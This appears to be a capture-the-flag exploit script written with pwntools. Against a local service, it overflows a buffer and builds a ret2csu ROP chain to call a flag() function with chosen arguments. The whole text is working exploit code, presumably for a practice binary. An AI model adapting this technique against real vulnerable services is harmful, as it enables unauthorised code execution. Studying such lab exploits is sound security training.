from pwn import *

p = remote("127.0.0.1", 1082)

# Find all the gadgets we need first

# 1st argument
pop_rdi = p64(0x4008c3) # pop rdi ; ret
 
# 2nd argument
pop_rsi = p64(0x4008c1) # pop rsi ; pop r15 ; ret

# 3rd argument 
csu1 = p64(0x4008ba)
_fini = p64(0x600e48)
csu2 = p64(0x4008a0)

# flag() function
win = p64(0x400717)

# Exploit
payload = b'A' * 168

# csu1
payload += csu1             # addr of pop rbx in csu
payload += p64(0)           # pop rbx
payload += p64(1)           # pop rbp (set to 1)
payload += _fini            # pop r12 (set to _fini)
payload += p64(0)           # pop r13
payload += p64(0)           # pop r14
payload += p64(0x12345678)  # pop r15 (set to 3rd argument)

# csu2
# this set of intructions will run first
# mov    rdx,r15
# mov    rsi,r14
# mov    edi,r13d
# call   QWORD PTR [r12+rbx*8]
# add    rbx,0x1
# cmp    rbp,rbx
payload += csu2

# continue back to same set of instructions in csu1,
payload += p64(0)           # add rsp,0x8 
payload += p64(0)           # pop rbx
payload += p64(0)           # pop rbp
payload += p64(0)           # pop r12
payload += p64(0)           # pop r13
payload += p64(0)           # pop r14
payload += p64(0)           # pop r15

# 1st & 2nd argument
payload += pop_rdi + p64(0xAAAABBBB)          # pop_rdi ; ret
payload += pop_rsi + p64(0xCCCCDDDD) + p64(0) # pop rsi ; pop r15 ; ret

# stack alignment
payload += p64(0x4005b6)

# flag()
payload += win

# send payload
p.sendline(payload)
p.interactive()
